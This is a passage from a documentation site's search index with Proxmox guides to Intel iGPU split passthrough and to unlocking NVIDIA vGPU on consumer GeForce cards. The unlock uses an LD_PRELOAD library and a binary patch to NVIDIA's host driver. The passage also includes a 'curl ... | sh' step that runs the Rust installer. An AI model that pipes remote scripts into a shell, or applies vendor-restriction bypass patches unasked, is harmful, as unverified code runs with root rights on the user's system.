0000:00:00.2: AMD-Vi: Found IOMMU cap 0x40\n[2.581776] perf/amd_iommu: Detected AMD IOMMU #0 (2 banks, 4 counters/bank).\n</code></pre>", "tags": ["proxmox", "igpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/igpu-split-passthrough/#windows-virtual-machine-igpu-passthrough-configuration", "title": "Windows Virtual Machine iGPU Passthrough Configuration", "text": "<p>For better results its recommend to use this Windwos 10/11 Virutal Machine configuration for proxmox.</p> <p>Find the PCI address of the iGPU.</p> <pre><code>lspci -nnv | grep VGA\n</code></pre> <p>This should result in output similar to this:</p> <pre><code>00:02.0 VGA compatible controller [0300]: Intel Corporation CometLake-S GT2 [UHD Graphics 630] [8086:3e92] (prog-if 00 [VGA controller])\n</code></pre> <p>If you have multiple VGA, look for the one that has the <code>Intel</code> in the name.</p> <p>Here, the PCI address of the iGPU is <code>00:02.0</code>.</p> <p></p> <p>For best performance the VM should be configured the <code>Machine</code> type to q35. This will allow the VM to utilize PCI-Express passthrough.</p> <p>Open the web gui and navigate to the <code>Hardware</code> tab of the VM you want to add a vGPU. Click <code>Add</code> above the device list and then choose <code>PCI Device</code></p> <p></p> <p>Open the <code>Device</code> dropdown and select the iGPU, which you can find using it\u2019s PCI address. This list uses a different format for the PCI addresses id, <code>00:02.0</code> is listed as <code>0000:00:02.0</code>.</p> <p></p> <p>Click <code>Mdev Type</code>, You should be presented with a list of the available split passthrough devices choose the better performing one for the vm.</p> <p></p> <p>Select <code>ROM-Bar</code>, <code>PCI-Express</code> and then click <code>Add</code>.</p> <p></p> <p>The Windows Virtual Machine Proxmox Setting should look like this:</p> <p></p> <p>Power on the Windows Virtual Machine.</p> <p>Open the VM's Console. Install the latest version of Intel's Graphics Driver or use the Intel Driver &amp; Support Assistant installer.</p> <p>If all when well you should see the following output in <code>Device Manager</code> and GPU-Z:</p> <p></p> <p>That's it! You should now be able to use the iGPU for hardware acceleration inside the VM and still have proxmox's output on the screen.</p>", "tags": ["proxmox", "igpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/igpu-split-passthrough/#linux-virtual-machine-igpu-passthrough-configuration", "title": "Linux Virtual Machine iGPU Passthrough Configuration", "text": "<p>We will be using Ubuntu Server 20.04 LTS for this guide.</p> <p>From Proxmox Terminal find the PCI address of the iGPU.</p> <pre><code>lspci -nnv | grep VGA\n</code></pre> <p>This should result in output similar to this:</p> <pre><code>00:02.0 VGA compatible controller [0300]: Intel Corporation CometLake-S GT2 [UHD Graphics 630] [8086:3e92] (prog-if 00 [VGA controller])\n</code></pre> <p>If you have multiple VGA, look for the one that has the <code>Intel</code> in the name.</p> <p></p> <p>Here, the PCI address of the iGPU is <code>00:02.0</code>.</p> <p>VM should be configured the <code>Machine</code> type to i440fx. Open the web gui and navigate to the <code>Hardware</code> tab of the VM you want to add a vGPU to. Click <code>Add</code> above the device list and then choose <code>PCI Device</code></p> <p></p> <p>Open the <code>Device</code> dropdown and select the iGPU, which you can find using it\u2019s PCI address. This list uses a different format for the PCI addresses id, <code>00:02.0</code> is listed as <code>0000:00:02.0</code>.</p> <p></p> <p>Click <code>Mdev Type</code>, You should be presented with a list of the available split passthrough devices choose the better performing one for the vm.</p> <p></p> <p>Select <code>ROM-Bar</code>, and then click <code>Add</code>.</p> <p></p> <p>The Ubuntu Virtual Machine Proxmox Setting should look like this:</p> <p></p> <p>Boot the VM. To test the iGPU passthrough was successful, you can use the following command:</p> <pre><code> sudo lspci -nnv | grep VGA\n</code></pre> <p>The output should incliude the Intel iGPU:</p> <pre><code>00:10.0 VGA compatible controller [0300]: Intel Corporation UHD Graphics 630 (Desktop) [8086:3e92] (prog-if 00 [VGA controller])\n</code></pre> <p>Now we need to check if the GPU's Driver initalization is working.</p> <pre><code>cd /dev/dri &amp;&amp; ls -la\n</code></pre> <p>The output should incliude the <code>renderD128</code></p> <p></p> <p>That's it! You should now be able to use the iGPU for hardware acceleration inside the VM and still have proxmox's output on the screen.</p>", "tags": ["proxmox", "igpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/igpu-split-passthrough/#debug", "title": "Debug", "text": "<p>Dbug Messages - Shows Hardware initialization and errors</p> <pre><code>dmesg -w\n</code></pre> <p>Display PCI devices information</p> <pre><code>lspci\n</code></pre> <p>Display Driver in use for PCI devices</p> <pre><code>lspci -k\n</code></pre> <p>Display IOMMU Groups the PCI devices are assigned to</p> <pre><code>#!/bin/bash\nshopt -s nullglob\nfor g in $(find /sys/kernel/iommu_groups/* -maxdepth 0 -type d | sort -V); do\n    echo \"IOMMU Group ${g##*/}:\"\n    for d in $g/devices/*; do\n        echo -e \"\\t$(lspci -nns ${d##*/})\"\n    done;\ndone;\n</code></pre>", "tags": ["proxmox", "igpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/vgpu-split-passthrough/", "title": "vGPU Split Passthrough (Nvidia)", "text": "", "tags": ["proxmox", "vgpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/vgpu-split-passthrough/#credit-and-thanks", "title": "Credit and Thanks", "text": "<p>Thanks to @polloloco for creating and maintaining this guide.</p> <p>Official GitLab repository: polloloco/vgpu-proxmox</p>", "tags": ["proxmox", "vgpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/vgpu-split-passthrough/#nvidia-vgpu-with-the-grid", "title": "NVIDIA vGPU with the GRID", "text": "<p>This document serves as a guide to install NVIDIA vGPU host drivers on the latest Proxmox VE version, at time of writing this its pve 8.2.</p> <p>You can follow this guide if you have a vGPU supported card from this list, or if you are using a consumer GPU from the GeForce series or a non-vGPU qualified Quadro GPU. There are several sections with a title similar to \"Have a vGPU supported GPU? Read here\" in this document, make sure to read those very carefully as this is where the instructions differ for a vGPU qualified card and a consumer card.</p>", "tags": ["proxmox", "vgpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/vgpu-split-passthrough/#supported-cards", "title": "Supported cards", "text": "<p>The following consumer/not-vGPU-qualified NVIDIA GPUs can be used with vGPU: - Most GPUs from the Maxwell 2.0 generation (GTX 9xx, Quadro Mxxxx, Tesla Mxx) EXCEPT the GTX 970 - All GPUs from the Pascal generation (GTX 10xx, Quadro Pxxxx, Tesla Pxx) - All GPUs from the Turing generation (GTX 16xx, RTX 20xx, Txxxx)</p> <p>Starting from driver version 17.0, Pascal and earlier require additional patches, see below for more!</p> <p>If you have GPUs from the Ampere and Ada Lovelace generation, you are out of luck, unless you have a vGPU qualified card from this list like the A5000 or RTX 6000 Ada. If you have one of those cards, please consult the NVIDIA documentation for help with setting it up.</p> <p>!!! THIS MEANS THAT YOUR RTX 30XX or 40XX WILL NOT WORK !!!</p> <p>This guide and all my tests were done on a RTX 2080 Ti which is based on the Turing architechture.</p>", "tags": ["proxmox", "vgpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/vgpu-split-passthrough/#important-notes-before-starting", "title": "Important notes before starting", "text": "<ul> <li>This tutorial assumes you are using a clean install of Proxmox VE 8.2.</li> <li>If you are using Proxmox VE 8.2, you MUST use 16.x or 17.x drivers. Older versions only work with pve 7</li> <li>If you tried GPU-passthrough before, you absolutely MUST revert all of the steps you did to set that up.</li> <li>If you only have one GPU in your system with no iGPU, your local monitor will NOT give you any output anymore after the system boots up. Use SSH or a serial connection if you want terminal access to your machine.</li> <li>Most of the steps can be applied to other linux distributions, however I'm only covering Proxmox VE here.</li> </ul>", "tags": ["proxmox", "vgpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/vgpu-split-passthrough/#are-you-upgrading-from-a-previous-version-of-this-guide", "title": "Are you upgrading from a previous version of this guide?", "text": "<p>If you are upgrading from a previous version of this guide, you should uninstall the old driver by running <code>nvidia-uninstall</code> first.</p> <p>Then you also have to make sure that you are using the latest version of <code>vgpu_unlock-rs</code>, otherwise it won't work with the latest driver.</p> <p>Either delete the folder <code>/opt/vgpu_unlock-rs</code> or enter the folder and run <code>git pull</code> and then recompile the library again using <code>cargo build --release</code></p>", "tags": ["proxmox", "vgpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/vgpu-split-passthrough/#packages", "title": "Packages", "text": "<p>Make sure to add the community pve repo and get rid of the enterprise repo (you can skip this step if you have a valid enterprise subscription)</p> <pre><code>echo \"deb http://download.proxmox.com/debian/pve bookworm pve-no-subscription\" &gt;&gt; /etc/apt/sources.list\nrm /etc/apt/sources.list.d/pve-enterprise.list\n</code></pre> <p>Update and upgrade <pre><code>apt update\napt dist-upgrade\n</code></pre></p> <p>We need to install a few more packages like git, a compiler and some other tools. <pre><code>apt install -y git build-essential dkms pve-headers mdevctl\n</code></pre></p>", "tags": ["proxmox", "vgpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/vgpu-split-passthrough/#git-repos-and-rust-compiler", "title": "Git repos and Rust compiler", "text": "<p>First, clone this repo to your home folder (in this case <code>/root/</code>) <pre><code>git clone https://gitlab.com/polloloco/vgpu-proxmox.git\n</code></pre></p> <p>You also need the vgpu_unlock-rs repo <pre><code>cd /opt\ngit clone https://github.com/mbilker/vgpu_unlock-rs.git\n</code></pre></p> <p>After that, install the rust compiler <pre><code>curl https://sh.rustup.rs -sSf | sh -s -- -y --profile minimal\n</code></pre></p> <p>Now make the rust binaries available in your $PATH (you only have to do it the first time after installing rust) <pre><code>source $HOME/.cargo/env\n</code></pre></p> <p>Enter the <code>vgpu_unlock-rs</code> directory and compile the library. Depending on your hardware and internet connection that may take a while <pre><code>cd vgpu_unlock-rs/\ncargo build --release\n</code></pre></p>", "tags": ["proxmox", "vgpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/vgpu-split-passthrough/#create-files-for-vgpu-unlock", "title": "Create files for vGPU unlock", "text": "<p>The vgpu_unlock-rs library requires a few files and folders in order to work properly, lets create those</p> <p>First create the folder for your vgpu unlock config and create an empty config file <pre><code>mkdir /etc/vgpu_unlock\ntouch /etc/vgpu_unlock/profile_override.toml\n</code></pre></p> <p>Then, create folders and files for systemd to load the vgpu_unlock-rs library when starting the nvidia vgpu services <pre><code>mkdir /etc/systemd/system/{nvidia-vgpud.service.d,nvidia-vgpu-mgr.service.d}\necho -e \"[Service]\\nEnvironment=LD_PRELOAD=/opt/vgpu_unlock-rs/target/release/libvgpu_unlock_rs.so\" &gt; /etc/systemd/system/nvidia-vgpud.service.d/vgpu_unlock.conf\necho -e \"[Service]\\nEnvironment=LD_PRELOAD=/opt/vgpu_unlock-rs/target/release/libvgpu_unlock_rs.so\" &gt; /etc/systemd/system/nvidia-vgpu-mgr.service.d/vgpu_unlock.conf\n</code></pre></p>", "tags": ["proxmox", "vgpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/vgpu-split-passthrough/#have-a-vgpu-supported-card-read-here", "title": "Have a vgpu supported card? Read here!", "text": "<p>PLEASE READ THIS</p> <p>Starting from 17.0, all Pascal (and older) GPUs are not officially supported anymore. If you still want to use them, stay on the LTS 16.x branch.</p> <p>There are ways to use the 17.x driver too, but in that case you have to patch the driver even with a \"supported\" GPU, and go through some extra steps like copying the old vgpuConfig.xml. I might explain this in the future. </p> <p>If you don't have a supported gpu from this list, please continue reading at Enabling IOMMU</p> <p>Disable the unlock part as doing this on a gpu that already supports vgpu, could break things as it introduces unnecessary complexity and more points of possible failure: <pre><code>echo \"unlock = false\" &gt; /etc/vgpu_unlock/config.toml\n</code></pre></p>", "tags": ["proxmox", "vgpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/vgpu-split-passthrough/#enabling-iommu", "title": "Enabling IOMMU", "text": "", "tags": ["proxmox", "vgpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/vgpu-split-passthrough/#note-usually-this-isnt-required-for-vgpu-to-work-but-it-doesnt-hurt-to-enable-it-you-can-skip-this-section-but-if-you-run-into-problems-later-on-make-sure-to-enable-iommu", "title": "Note: Usually this isn't required for vGPU to work, but it doesn't hurt to enable it. You can skip this section, but if you run into problems later on, make sure to enable IOMMU.", "text": "<p>To enable IOMMU you have to enable it in your BIOS/UEFI first. Due to it being vendor specific, I am unable to provide instructions for that, but usually for Intel systems the option you are looking for is called something like \"Vt-d\", AMD systems tend to call it \"IOMMU\".</p> <p>After enabling it in your BIOS/UEFI, you also have to enable it in your kernel. Depending on how your system is booting, there are two ways to do that.</p> <p>If you installed your system with ZFS-on-root and in UEFI mode, then you are using systemd-boot, everything else is GRUB. GRUB is way more common so if you are unsure, you are probably using that.</p> <p>Depending on which system you are using to boot, you have to chose from the following two options:</p> GRUB    Open the file `/etc/default/grub` in your favorite editor   <pre><code>nano /etc/default/grub\n</code></pre>    The kernel parameters have to be appended to the variable `GRUB_CMDLINE_LINUX_DEFAULT`. On a clean installation that line should look like this   <pre><code>GRUB_CMDLINE_LINUX_DEFAULT=\"quiet\"\n</code></pre>    If you are using an Intel system, append this after `quiet`:   <pre><code>intel_iommu=on\n</code></pre>    On AMD systems, you don't have to add anything and amd_iommu=on does not exist:   https://www.kernel.org/doc/html/latest/admin-guide/kernel-parameters.html?highlight=amd_iommu    For either AMD or Intel there is an option incase you have heavy performance issues, but with the loss of security and stability of the system:   <pre><code>iommu=pt\n</code></pre>    The result should look like this (for intel systems):   <pre><code>GRUB_CMDLINE_LINUX_DEFAULT=\"quiet intel_iommu=on\"\n</code></pre>    Now, save and exit from the editor using Ctrl+O and then Ctrl+X and then apply your changes:   <pre><code>update-grub\n</code></pre> systemd-boot    The kernel parameters have to be appended to the commandline in the file `/etc/kernel/cmdline`, so open that in your favorite editor:   <pre><code>nano /etc/kernel/cmdline\n</code></pre>    On a clean installation the file might look similar to this:   <pre><code>root=ZFS=rpool/ROOT/pve-1 boot=zfs\n</code></pre>    On Intel systems, append this at the end   <pre><code>intel_iommu=on\n</code></pre>    On AMD systems, you don't have to add anything and amd_iommu=on does not exist:   https://www.kernel.org/doc/html/latest/admin-guide/kernel-parameters.html?highlight=amd_iommu    For either AMD or Intel there is an option incase you have heavy performance issues, but with the loss of security and stability of the system:   <pre><code>iommu=pt\n</code></pre>    After editing the file, it should look similar to this   <pre><code>root=ZFS=rpool/ROOT/pve-1 boot=zfs intel_iommu=on\n</code></pre>    Now, save and exit from the editor using Ctrl+O and then Ctrl+X and then apply your changes:   <pre><code>proxmox-boot-tool refresh\n</code></pre>", "tags": ["proxmox", "vgpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/vgpu-split-passthrough/#loading-required-kernel-modules-and-blacklisting-the-open-source-nvidia-driver", "title": "Loading required kernel modules and blacklisting the open source nvidia driver", "text": "<p>We have to load the <code>vfio</code>, <code>vfio_iommu_type1</code>, <code>vfio_pci</code> and <code>vfio_virqfd</code> kernel modules to get vGPU working <pre><code>echo -e \"vfio\\nvfio_iommu_type1\\nvfio_pci\\nvfio_virqfd\" &gt;&gt; /etc/modules\n</code></pre></p> <p>Proxmox comes with the open source nouveau driver for nvidia gpus, however we have to use our patched nvidia driver to enable vGPU. The next line will prevent the nouveau driver from loading <pre><code>echo \"blacklist nouveau\" &gt;&gt; /etc/modprobe.d/blacklist.conf\n</code></pre></p>", "tags": ["proxmox", "vgpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/vgpu-split-passthrough/#applying-our-kernel-configuration", "title": "Applying our kernel configuration", "text": "<p>I'm not sure if this is needed, but it doesn't hurt :)</p> <pre><code>update-initramfs -u -k all\n</code></pre> <p>...and reboot <pre><code>reboot\n</code></pre></p>", "tags": ["proxmox", "vgpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/vgpu-split-passthrough/#check-if-iommu-is-enabled", "title": "Check if IOMMU is enabled", "text": "", "tags": ["proxmox", "vgpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/vgpu-split-passthrough/#note-see-section-enabling-iommu-this-is-optional", "title": "Note: See section \"Enabling IOMMU\", this is optional", "text": "<p>Wait for your server to restart, then type this into a root shell <pre><code>dmesg | grep -e DMAR -e IOMMU\n</code></pre></p> <p>On my Intel system the output looks like this <pre><code>[    0.007235] ACPI: DMAR 0x000000009CC98B68 0000B8 (v01 INTEL  BDW      00000001 INTL 00000001)\n[    0.007255] ACPI: Reserving DMAR table memory at [mem 0x9cc98b68-0x9cc98c1f]\n[    0.020766] DMAR: IOMMU enabled\n[    0.062294] DMAR: Host address width 39\n[    0.062296] DMAR: DRHD base: 0x000000fed90000 flags: 0x0\n[    0.062300] DMAR: dmar0: reg_base_addr fed90000 ver 1:0 cap c0000020660462 ecap f0101a\n[    0.062302] DMAR: DRHD base: 0x000000fed91000 flags: 0x1\n[    0.062305] DMAR: dmar1: reg_base_addr fed91000 ver 1:0 cap d2008c20660462 ecap f010da\n[    0.062307] DMAR: RMRR base: 0x0000009cc18000 end: 0x0000009cc25fff\n[    0.062309] DMAR: RMRR base: 0x0000009f000000 end: 0x000000af1fffff\n[    0.062312] DMAR-IR: IOAPIC id 8 under DRHD base  0xfed91000 IOMMU 1\n[    0.062314] DMAR-IR: HPET id 0 under DRHD base 0xfed91000\n[    0.062315] DMAR-IR: x2apic is disabled because BIOS sets x2apic opt out bit.\n[    0.062316] DMAR-IR: Use 'intremap=no_x2apic_optout' to override the BIOS setting.\n[    0.062797] DMAR-IR: Enabled IRQ remapping in xapic mode\n[    0.302431] DMAR: No ATSR found\n[    0.302432] DMAR: No SATC found\n[    0.302433] DMAR: IOMMU feature pgsel_inv inconsistent\n[    0.302435] DMAR: IOMMU feature sc_support inconsistent\n[    0.302436] DMAR: IOMMU feature pass_through inconsistent\n[    0.302437] DMAR: dmar0: Using Queued invalidation\n[    0.302443] DMAR: dmar1: Using Queued invalidation\n[    0.333474] DMAR: Intel(R) Virtualization Technology for Directed I/O\n[    3.990175] i915 0000:00:02.0: [drm] DMAR active, disabling use of stolen memory\n</code></pre></p> <p>Depending on your mainboard and cpu, the output will be different, in my output the important line is the third one: <code>DMAR: IOMMU enabled</code>. If you see something like that, IOMMU is enabled.</p>", "tags": ["proxmox", "vgpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/vgpu-split-passthrough/#nvidia-driver", "title": "NVIDIA Driver", "text": "<p>This repo contains patches that allow you to use vGPU on not-qualified-vGPU cards (consumer GPUs). Those patches are binary patches, which means that each patch works ONLY for a specific driver version.</p> <p>I've created patches for the following driver versions: - 17.3 (550.90.05) - 17.1 (550.54.16) - 17.0 (550.54.10) - 16.7 (535.183.04) !!! USE THIS IF YOU ARE ON PASCAL OR OLDER !!! - 16.5 (535.161.05) the patch for this version is the same as for 16.4, the host driver wasnt changed in this release - 16.4 (535.161.05) - 16.2 (535.129.03) - 16.1 (535.104.06) - 16.0 (535.54.06)</p> <p>Driver support by nvidia: - 16.x is the LTS branch, with official support until July 2026 - 17.x has official support until February 2025</p> <p>You can choose which of those you want to use, but generally its recommended to use the latest, most up-to-date version (17.3 in this case), unless you have a pascal series GPU or older, then use the latest 16.x driver.</p> <p>If you have a vGPU qualified GPU, you can use other versions too, because you don't need to patch the driver. However, you still have to make sure they are compatible with your proxmox version and kernel. Also I would not recommend using any older versions unless you have a very specific requirement.</p>", "tags": ["proxmox", "vgpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/vgpu-split-passthrough/#the-following-versions-are-eol-dont-use-them-unless-you-have-a-very-specific-reason", "title": "The following versions are EOL, don't use them unless you have a very specific reason!", "text": "<ul> <li>15.1 (525.85.07)</li> <li>15.0 (525.60.12)</li> <li>14.4 (510.108.03)</li> <li>14.3 (510.108.03)</li> <li>14.2 (510.85.03)</li> </ul>", "tags": ["proxmox", "vgpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/vgpu-split-passthrough/#obtaining-the-driver", "title": "Obtaining the driver", "text": "<p>NVIDIA doesn't let you freely download vGPU drivers like they do with GeForce or normal Quadro drivers, instead you have to download them through the NVIDIA Licensing Portal (see: https://www.nvidia.com/en-us/drivers/vgpu-software-driver/). You can sign up for a free evaluation to get access to the download page.</p> <p>NB: When applying for an eval license, do NOT use your personal email or other email at a free email provider like gmail.com. You will probably have to go through manual review if you use such emails. I have very good experience using a custom domain for my email address, that way the automatic verification usually lets me in after about five minutes.</p> <p>I've created a small video tutorial to find the right driver version on the NVIDIA Enterprise Portal. In the video I'm downloading the 15.0 driver, if you want a different one just replace 15.0 with the version you want:</p> <p></p> <p>After downloading, extract the zip file and then copy the file called <code>NVIDIA-Linux-x86_64-DRIVERVERSION-vgpu-kvm.run</code> (where DRIVERVERSION is a string like <code>550.90.05</code>) from the <code>Host_Drivers</code> folder to your Proxmox host into the <code>/root/</code> folder using tools like FileZilla, WinSCP, scp or rsync.</p>", "tags": ["proxmox", "vgpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/vgpu-split-passthrough/#from-here-on-i-will-be-using-the-173-driver-but-the-steps-are-the-same-for-other-driver-versions", "title": "\u26a0\ufe0f From here on, I will be using the 17.3 driver, but the steps are the same for other driver versions", "text": "<p>For example when I run a command like <code>chmod +x NVIDIA-Linux-x86_64-550.90.05-vgpu-kvm.run</code>, you should replace <code>550.90.05</code> with the driver version you are using (if you are using a different one). You can get the list of version numbers here.</p> <p>Every step where you potentially have to replace the version name will have this warning emoji next to it: \u26a0\ufe0f</p>", "tags": ["proxmox", "vgpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/vgpu-split-passthrough/#have-a-vgpu-supported-card-read-here_1", "title": "Have a vgpu supported card? Read here!", "text": "<p>PLEASE READ THIS</p> <p>Starting from 17.0, all Pascal (and older) GPUs are not officially supported anymore. If you still want to use them, stay on the LTS 16.x branch.</p> <p>There are ways to use the 17.x driver too, but in that case you have to patch the driver even with a \"supported\" GPU, and go through some extra steps like copying the old vgpuConfig.xml. I might explain this in the future. </p> <p>If you have a vgpu supported gpu from this list, patching is not necessary, and you can skip this step. You can simply install the driver package like this:</p> <p>\u26a0\ufe0f <pre><code>chmod +x NVIDIA-Linux-x86_64-550.90.05-vgpu-kvm.run\n./NVIDIA-Linux-x86_64-550.90.05-vgpu-kvm.run --dkms -m=kernel\n</code></pre></p> <p>To finish the installation, reboot the system <pre><code>reboot\n</code></pre></p> <p>Now, skip the following two sections and continue at Finishing touches</p>", "tags": ["proxmox", "vgpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/vgpu-split-passthrough/#patching-the-driver", "title": "Patching the driver", "text": "<p>Now, on the proxmox host, make the driver executable</p> <p>\u26a0\ufe0f <pre><code>chmod +x NVIDIA-Linux-x86_64-550.90.05-vgpu-kvm.run\n</code></pre></p> <p>And then patch it</p> <p>\u26a0\ufe0f <pre><code>./NVIDIA-Linux-x86_64-550.90.05-vgpu-kvm.run --apply-patch ~/vgpu-proxmox/550.90.05.patch\n</code></pre> That should output a lot of lines ending with <pre><code>Self-extractible archive \"NVIDIA-Linux-x86_64-550.90.05-vgpu-kvm-custom.run\" successfully created.\n</code></pre></p> <p>You should now have a file called <code>NVIDIA-Linux-x86_64-550.90.05-vgpu-kvm-custom.run</code>, that is your patched driver.</p>", "tags": ["proxmox", "vgpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/vgpu-split-passthrough/#installing-the-driver", "title": "Installing the driver", "text": "<p>Now that the required patch is applied, you can install the driver</p> <p>\u26a0\ufe0f <pre><code>./NVIDIA-Linux-x86_64-550.90.05-vgpu-kvm-custom.run --dkms -m=kernel\n</code></pre></p> <p>The installer will ask you <code>Would you like to register the kernel module sources with DKMS? This will allow DKMS to automatically build a new module, if you install a different kernel later.</code>, answer with <code>Yes</code>.</p> <p>Depending on your hardware, the installation could take a minute or two.</p> <p>If everything went right, you will be presented with this message. <pre><code>Installation of the NVIDIA Accelerated Graphics Driver for Linux-x86_64 (version: 550.90.05) is now complete.\n</code></pre></p> <p>Click <code>Ok</code> to exit the installer.</p> <p>To finish the installation, reboot. <pre><code>reboot\n</code></pre></p>", "tags": ["proxmox", "vgpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/vgpu-split-passthrough/#finishing-touches", "title": "Finishing touches", "text": "<p>Wait for your server to reboot, then type this into the shell to check if the driver install worked <pre><code>nvidia-smi\n</code></pre></p> <p>You should get an output similar to this one <pre><code>Tue Jan 24 20:21:28 2023\n+-----------------------------------------------------------------------------+\n| NVIDIA-SMI 525.85.07    Driver Version: 525.85.07    CUDA Version: N/A      |\n|-------------------------------+----------------------+----------------------+\n| GPU  Name        Persistence-M| Bus-Id        Disp.A | Volatile Uncorr. ECC |\n| Fan  Temp  Perf  Pwr:Usage/Cap|         Memory-Usage | GPU-Util  Compute M. |\n|                               |                      |               MIG M. |\n|===============================+======================+======================|\n|   0  NVIDIA GeForce ...  On   | 00000000:01:00.0 Off |                  N/A |\n| 26%   33C    P8    43W / 260W |     85MiB / 11264MiB |      0%      Default |\n|                               |                      |                  N/A |\n+-------------------------------+----------------------+----------------------+\n\n+-----------------------------------------------------------------------------+\n| Processes:                                                                  |\n|  GPU   GI   CI        PID   Type   Process name                  GPU Memory |\n|        ID   ID                                                   Usage      |\n|=============================================================================|\n|  No running processes found                                                 |\n+-----------------------------------------------------------------------------+\n</code></pre></p> <p>To verify if the vGPU unlock worked, type this command <pre><code>mdevctl types\n</code></pre></p> <p>The output will be similar to this <pre><code>0000:01:00.0\n  nvidia-256\n    Available instances: 24\n    Device API: vfio-pci\n    Name: GRID RTX6000-1Q\n    Description: num_heads=4, frl_config=60, framebuffer=1024M, max_resolution=5120x2880, max_instance=24\n  nvidia-257\n    Available instances: 12\n    Device API: vfio-pci\n    Name: GRID RTX6000-2Q\n    Description: num_heads=4, frl_config=60, framebuffer=2048M, max_resolution=7680x4320, max_instance=12\n  nvidia-258\n    Available instances: 8\n    Device API: vfio-pci\n    Name: GRID RTX6000-3Q\n    Description: num_heads=4, frl_config=60, framebuffer=3072M, max_resolution=7680x4320, max_instance=8\n---SNIP---\n</code></pre></p> <p>If this command doesn't return any output, vGPU unlock isn't working.</p> <p>Another command you can try to see if your card is recognized as being vgpu enabled is this one: <pre><code>nvidia-smi vgpu\n</code></pre></p> <p>If everything worked right with the unlock, the output should be similar to this: <pre><code>Tue Jan 24 20:21:43 2023\n+-----------------------------------------------------------------------------+\n| NVIDIA-SMI 525.85.07              Driver Version: 525.85.07                 |\n|---------------------------------+------------------------------+------------+\n| GPU  Name                       | Bus-Id                       | GPU-Util   |\n|      vGPU ID     Name           | VM ID     VM Name            | vGPU-Util  |\n|=================================+==============================+============|\n|   0  NVIDIA GeForce RTX 208...  | 00000000:01:00.0             |   0%       |\n+---------------------------------+------------------------------+------------+\n</code></pre></p> <p>However, if you get this output, then something went wrong <pre><code>No supported devices in vGPU mode\n</code></pre></p> <p>If any of those commands give the wrong output, you cannot continue. Please make sure to read everything here very carefully and when in doubt, create an issue or join the discord server and ask for help there.</p>", "tags": ["proxmox", "vgpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/vgpu-split-passthrough/#vgpu-overrides", "title": "vGPU overrides", "text": "<p>Further up we have created the file <code>/etc/vgpu_unlock/profile_override.toml</code> and I didn't explain what it was for yet. Using that file you can override lots of parameters for your vGPU instances: For example you can change the maximum resolution, enable/disable the frame rate limiter, enable/disable support for CUDA or change the vram size of your virtual gpus.</p> <p>If we take a look at the output of <code>mdevctl types</code> we see lots of different types that we can choose from. However, if we for example chose <code>GRID RTX6000-4Q</code> which gives us 4GB of vram in a VM, we are locked to that type for all of our VMs. Meaning we can only have 4GB VMs, its not possible to mix different types to have one 4GB VM, and two 2GB VMs.</p> <p>All of that changes with the override config file. Technically we are still locked to only using one profile, but now its possible to change the vram of the profile on a VM basis so even though we have three <code>GRID RTX6000-4Q</code> instances, one VM can have 4GB or vram but we can override the vram size for the other two VMs to only 2GB.</p> <p>Lets take a look at this example config override file (its in TOML format) <pre><code>[profile.nvidia-259]\nnum_displays = 1          # Max number of virtual displays. Usually 1 if you want a simple remote gaming VM\ndisplay_width = 1920      # Maximum display width in the VM\ndisplay_height = 1080     # Maximum display height in the VM\nmax_pixels = 2073600      # This is the product of display_width and display_height so 1920 * 1080 = 2073600\ncuda_enabled = 1          # Enables CUDA support. Either 1 or 0 for enabled/disabled\nfrl_enabled = 1           # This controls the frame rate limiter, if you enable it your fps in the VM get locked to 60fps. Either 1 or 0 for enabled/disabled\nframebuffer = 0x74000000\nframebuffer_reservation = 0xC000000   # In combination with the framebuffer size\n                                      # above, these two lines will give you a VM\n                                      # with 2GB of VRAM (framebuffer + framebuffer_reservation = VRAM size in bytes).\n                                      # See below for some other sizes\n\n[vm.100]\nfrl_enabled = 0\n# You can override all the options from above here too. If you want to add more overrides for a new VM, just copy this block and change the VM ID\n</code></pre></p> <p>There are two blocks here, the first being <code>[profile.nvidia-259]</code> and the second <code>[vm.100]</code>. The first one applies the overrides to all VM instances of the <code>nvidia-259</code> type (thats <code>GRID RTX6000-4Q</code>) and the second one applies its overrides only to one specific VM, that one with the proxmox VM ID <code>100</code>.</p> <p>The proxmox VM ID is the same number that you see in the proxmox webinterface, next to the VM name.</p> <p>You don't have to specify all parameters, only the ones you need/want. There are some more that I didn't mention here, you can find them by going through the source code of the <code>vgpu_unlock-rs</code> repo.</p> <p>For a simple 1080p remote gaming VM I recommend going with something like this <pre><code>[profile.nvidia-259] # choose the profile you want here\nnum_displays = 1\ndisplay_width = 1920\ndisplay_height = 1080\nmax_pixels = 2073600\n</code></pre></p>", "tags": ["proxmox", "vgpu", "passthrough"]}, {"location": "infrastructure/proxmox/gpu-passthrough/vgpu-split-passthrough/#important-notes", "title": "Important notes", "text": "<p>Q profiles can give you horrible performance in OpenGL applications/games (if you have a consumer 